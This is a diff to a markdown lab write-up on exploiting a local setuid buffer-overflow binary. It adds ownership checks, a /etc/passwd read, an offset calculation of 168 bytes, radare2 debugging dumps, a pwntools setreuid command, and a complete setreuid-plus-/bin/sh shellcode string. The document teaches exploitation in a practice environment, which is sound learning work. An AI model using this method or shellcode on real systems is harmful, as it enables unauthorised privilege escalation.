@@ -57,16 +57,21 @@ Basic Buffer Overflows
       - [Crash and Debug  the Task 8 program](#crash-and-debug--the-task-8-program)
       - [Exploit the Task 8 program](#exploit-the-task-8-program)
   - [Buffer Overflow 2](#buffer-overflow-2)
+    - [Verify file ownership](#verify-file-ownership)
     - [Task 9 Code](#task-9-code)
     - [Find the Task 9 Segmentation Error](#find-the-task-9-segmentation-error)
     - [Examine the Task 9 Flow](#examine-the-task-9-flow)
-    - [](#)
+    - [Determine payload size](#determine-payload-size)
+    - [Locate rbp and review the registers](#locate-rbp-and-review-the-registers)
+    - [Obtain a setuid shellcode](#obtain-a-setuid-shellcode)
+    - [Shellcode](#shellcode-1)
 
 
 ## Tools
 
 - radare2  
 - ragg2
+- pwn
 
 ## Process Layout
 
@@ -1348,6 +1353,26 @@ sh-4.2$
 
 ## Buffer Overflow 2
 
+### Verify file ownership
+
+```md
+[user1@ip-10-66-173-20 overflow-4]$ ls -alh
+total 20K
+drwxrwxr-x 2 user1 user1   76 Sep  3  2019 .
+drwx------ 7 user1 user1  169 Nov 27  2019 ..
+-rwsr-xr-x 1 user3 user3 8.1K Sep  3  2019 buffer-overflow-2
+-rw-rw-r-- 1 user1 user1  250 Sep  3  2019 buffer-overflow-2.c
+-rw------- 1 user3 user3   17 Sep  2  2019 secret.txt
+[user1@ip-10-66-173-20 overflow-4]$ cat /etc/passwd
+user1:x:1001:1001::/home/user1:/bin/bash
+user2:x:1002:1002::/home/user2:/bin/bash
+user3:x:1003:1003::/home/user3:/bin/bash
+[user1@ip-10-66-173-20 overflow-4]$ 
+
+```
+
+`user3` owns the target program  
+
 ### Task 9 Code
 
 ```c
@@ -1465,10 +1490,10 @@ var_a8h @ rbp minus 168 bytes
 rsp : rbp minus 176 bytes  
   
 ```md
-           0x00400532      4889bd58ffff.  mov qword [var_a8h], rdi    ; arg1 <- move the memory address stored in rdi (which points to the string) into the variable var_a8h
-           0x00400539      48b8646f6767.  movabs rax, 0x6f67676f64    ; 'doggo'<- move the absolute value of the hex (which turns out to be doggo) and place it into rax register, not a memory pointer
+           0x00400532      4889bd58ffff.  mov qword [var_a8h], rdi    ; arg1 <- move the memory address stored in rdi, this memory address points to the input string
+           0x00400539      48b8646f6767.  movabs rax, 0x6f67676f64    ; 'doggo'<- move the absolute value of the hex ('doggo') into rax register, not a memory pointer
            0x00400543      ba00000000     mov edx, 0 ; <-zero out edx>
-           0x00400548      48898560ffff.  mov qword [var_a0h], rax ; <- move the 8-bytes stored in the rax register to the variable var_a0h, this is 'doggo'>
+           0x00400548      48898560ffff.  mov qword [var_a0h], rax ; <- move the 8-bytes stored in the rax register to the variable var_a0h, the variable now contains 'doggo'>
            0x0040054f      48899568ffff.  mov qword [var_98h], rdx ; <-move the 8 bytes stored in the rdx register into the variable var_98h which stores 8 zero bytes in rdx since edx was zeroed in a previous instruction>
            0x00400556      488d9570ffff.  lea rdx, [var_90h] ; <- load effective addres of var_90h into the rdx register>
            0x0040055d      b800000000     mov eax, 0 ;<- zero out eax>
@@ -1481,7 +1506,7 @@ rsp : rbp minus 176 bytes
            0x00400577      488b9558ffff.  mov rdx, qword [var_a8h] ; <- move the 8 bytes stored at the beginning of var_a8h into rdx, this moves the memory pointer which points to the string into rdx>
            0x0040057e      488d8560ffff.  lea rax, [var_a0h] ;<- load the effective address of var_a0h into rax. This will be the memory address that points to the doggo string>
            0x00400585      4889d6         mov rsi, rdx ;<- move the memory address stored in rdx to rsi, rsi now contains the pointer to the input string>
-           0x00400588      4889c7         mov rdi, rax ; <- load the memory address at rax into rdi, rdi now contains the memory address pointing to the doggo string>
+           0x00400588      4889c7         mov rdi, rax ; <- load the memory address at rax into rdi, rdi now contains the memory address pointing to the doggo string (KEY INSTRUCTION)>
            0x0040058b      e8b0feffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2) <- call the string  concatenation function and send two parameters. rdi contains the pointer to the doggo string and rsi contains the pointer to the input string. The result is written back to the same memory location which rdi points to. this is where the buffer overflow happens.>
            0x00400590      488d8560ffff.  lea rax, [var_a0h] ; <- load the effective address of var_a0h into rax. this was the memory address pointing to the doggo string, and is now the memory address pointing to the concatenated string>
            0x00400597      4889c6         mov rsi, rax ;< move the memory address pointing to the concatenated string into rsi register>
@@ -1495,4 +1520,163 @@ rsp : rbp minus 176 bytes
 
 ```
 
-### 
+### Determine payload size
+
+'doggo' is stored into var_a0h, at rbp minus 160 bytes
+The memory address pointing to var_a0h is loaded into the rax register
+The same memory address is then loaded into the rdi register
+The `rdi` register now contains the memory address pointing to 'doggo', at var_a0h
+After the strcat function, the `rdi` register contains the memory address which points to the concatenated string
+The `rdi` register points to var_a0h at rbp minus 160. 
+The return address is at rbp plus 8.
+This indicates the payload size must be 168 to cause the buffer overflow.
+
+### Locate rbp and review the registers
+
+run buffer-overvflow-2 in debug mode and crash it for analysis: 
+`[user1@ip-10-66-173-20 overflow-4]$ r2 -d ./buffer-overflow-2 $(ragg2 -P 170 -r)`
+
+Set breakpoints inside the sym.concat_arg function  
+Use `dc` to continue program execution to the first debug point  
+Use `dr` to dump the registers at the first breakpoint:  
+
+```md
+[0x00400527]> db 0x0040058b 
+[0x7ffff7dd9ef0]> db 0x0040058b (before executing the concatenation)
+[0x7ffff7dd9ef0]> db 0x00400597 (after loading the effactive address of [var_a0h] into rax)
+[0x7ffff7dd9ef0]> db 0x004005a4 (before executing printf)
+[0x7ffff7dd9ef0]> db 0x004005a9 (after executing printf)
+[0x7ffff7dd9ef0]> dc
+hit breakpoint at: 40058b
+[0x0040058b]> dr
+rax = 0x7fffffffe230
+rbx = 0x00000000
+rcx = 0x00000000
+rdx = 0x7fffffffe62d
+r8 = 0x00400650
+r9 = 0x7ffff7de8370
+r10 = 0x00000008
+r11 = 0x7ffff7ffa19c
+r12 = 0x00400450
+r13 = 0x7fffffffe3d0
+r14 = 0x00000000
+r15 = 0x00000000
+rsi = 0x7fffffffe62d
+rdi = 0x7fffffffe230
+rsp = 0x7fffffffe220
+rbp = 0x7fffffffe2d0 <- We have the memory address for the target register
+rip = 0x0040058b
+rflags = 0x00000206
+orax = 0xffffffffffffffff
+```
+
+Check the contents of `rdi`
+
+```md
+[0x0040058b]> px 50 @ rdi
+- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0x7fffffffe230  646f 6767 6f00 0000 0000 0000 0000 0000  doggo...........
+0x7fffffffe240  0000 0000 0000 0000 0000 0000 0000 0000  ................
+0x7fffffffe250  0000 0000 0000 0000 0000 0000 0000 0000  ................
+0x7fffffffe260  0000                                     ..
+[0x0040058b]> 
+ 
+```
+
+Check the contents of `rsi` to ensure it contains the ragg2 pattern.  
+
+```md
+[0x00400440]> px 170 @ rsi
+- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0x7fffffffe62b  4141 4142 4141 4341 4144 4141 4541 4146  AAABAACAADAAEAAF
+0x7fffffffe63b  4141 4741 4148 4141 4941 414a 4141 4b41  AAGAAHAAIAAJAAKA
+0x7fffffffe64b  414c 4141 4d41 414e 4141 4f41 4150 4141  ALAAMAANAAOAAPAA
+0x7fffffffe65b  5141 4152 4141 5341 4154 4141 5541 4156  QAARAASAATAAUAAV
+0x7fffffffe66b  4141 5741 4158 4141 5941 415a 4141 6141  AAWAAXAAYAAZAAaA
+0x7fffffffe67b  4162 4141 6341 4164 4141 6541 4166 4141  AbAAcAAdAAeAAfAA
+0x7fffffffe68b  6741 4168 4141 6941 416a 4141 6b41 416c  gAAhAAiAAjAAkAAl
+0x7fffffffe69b  4141 6d41 416e 4141 6f41 4170 4141 7141  AAmAAnAAoAApAAqA
+0x7fffffffe6ab  4172 4141 7341 4174 4141 7541 4176 4141  ArAAsAAtAAuAAvAA
+0x7fffffffe6bb  7741 4178 4141 7941 417a 4141 3141 4132  wAAxAAyAAzAA1AA2
+0x7fffffffe6cb  4141 3341 4134 4141 3541                 AA3AA4AA5A
+[0x00400440]> 
+
+```
+
+Use `dc` to move to the next breakpoint and dump the registers with `dr`  
+
+```md
+[0x0040058b]> dc
+hit breakpoint at: 400597
+[0x00400597]> dr
+rax = 0x7fffffffe230 <- memory addres of [var_a0h], and rbp minus 160>
+rbx = 0x00000000
+rcx = 0x7fffffffe6d0
+rdx = 0x7fffffffe2da
+r8 = 0x00400650
+r9 = 0x3341413241413141
+r10 = 0x000004ce
+r11 = 0x7ffff7abea10
+r12 = 0x00400450
+r13 = 0x7fffffffe3d0
+r14 = 0x00000000
+r15 = 0x00000000
+rsi = 0x0000000a
+rdi = 0x7fffffffe230
+rsp = 0x7fffffffe220
+rbp = 0x7fffffffe2d0 <- not changed
+rip = 0x00400597
+rflags = 0x00000202
+orax = 0xffffffffffffffff
+```
+
+Since we have executed the concatenation function, we should be able to find the concatenated string in rdi.  
+
+```md
+[0x00400597]> px 180 @ rdi
+- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0x7fffffffe230  646f 6767 6f41 4141 4241 4143 4141 4441  doggoAAABAACAADA
+0x7fffffffe240  4145 4141 4641 4147 4141 4841 4149 4141  AEAAFAAGAAHAAIAA
+0x7fffffffe250  4a41 414b 4141 4c41 414d 4141 4e41 414f  JAAKAALAAMAANAAO
+0x7fffffffe260  4141 5041 4151 4141 5241 4153 4141 5441  AAPAAQAARAASAATA
+0x7fffffffe270  4155 4141 5641 4157 4141 5841 4159 4141  AUAAVAAWAAXAAYAA
+0x7fffffffe280  5a41 4161 4141 6241 4163 4141 6441 4165  ZAAaAAbAAcAAdAAe
+0x7fffffffe290  4141 6641 4167 4141 6841 4169 4141 6a41  AAfAAgAAhAAiAAjA
+0x7fffffffe2a0  416b 4141 6c41 416d 4141 6e41 416f 4141  AkAAlAAmAAnAAoAA
+0x7fffffffe2b0  7041 4171 4141 7241 4173 4141 7441 4175  pAAqAArAAsAAtAAu
+0x7fffffffe2c0  4141 7641 4177 4141 7841 4179 4141 7a41  AAvAAwAAxAAyAAzA
+0x7fffffffe2d0  4131 4141 3241 4133 4141 3441 4135 4100  A1AA2AA3AA4AA5A.
+0x7fffffffe2e0  d8e3 ffff                                ....
+[0x00400597]> 
+```
+
+Summary:  
+
+rbp + 8 = 0x7FFFFFFFE2D8
+rbp = 0x7fffffffe2d0
+rbp minus 160 = 0x7fffffffe230
+
+Meaning:
+
+The NOP sled begins at 0x7fffffffe230
+The shell code is written after the NOP sled but terminates before 0x7FFFFFFFE2D8 (rbp +8)
+The malicious return address begins at 0x7FFFFFFFE2D8 (rbp +8) and must point to a memory address after 0x7fffffffe230 (rbp minus 160) but before the shell code.
+
+### Obtain a setuid shellcode
+
+```md
+root@ip-10-66-67-9:~# pwn shellcraft -f d amd64.linux.setreuid 1003
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.8/update to 'never' (old way).
+    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
+        [update]
+        interval=never
+[*] A newer version of pwntools is available on pypi (4.13.1 --> 4.15.0).
+    Update with: $ pip install -U pwntools
+\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
+root@ip-10-66-67-9:~# 
+```
+
+### Shellcode
+
+`\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05`  
